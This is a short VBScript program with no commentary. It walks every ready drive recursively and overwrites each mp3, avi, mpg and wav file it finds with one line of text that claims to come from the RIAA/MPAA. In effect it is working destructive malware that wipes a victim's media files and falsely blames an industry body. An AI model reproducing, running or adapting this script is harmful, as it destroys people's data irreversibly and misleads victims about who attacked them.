Set music = createobject("scripting.filesystemobject") 
Set Drives=music.drives 
For Each Drive in Drives
If drive.isready then
MPAA drive & "\"
end If 
Next
Sub MPAA(FIL)
On Error Resume Next
Set confacio = music.GetFolder(FIL)
For Each RIAA In confacio.Files
If music.GetExtensionName(RIAA.path)="mp3" or music.GetExtensionName(RIAA.path)="avi" or 
music.GetExtensionName(RIAA.path)="mpg" or music.GetExtensionName(RIAA.path)="wav" then
Set wdfrt = music.createtextfile(RIAA.path, True)
wdfrt.writeline "you should not steal our hard work. thanks for understanding why we did this. RIAA/MPAA."
wdfrt.Close
end if
Next
For Each fixer In confacio.SubFolders
MPAA(fixer.Path)
Next
End Sub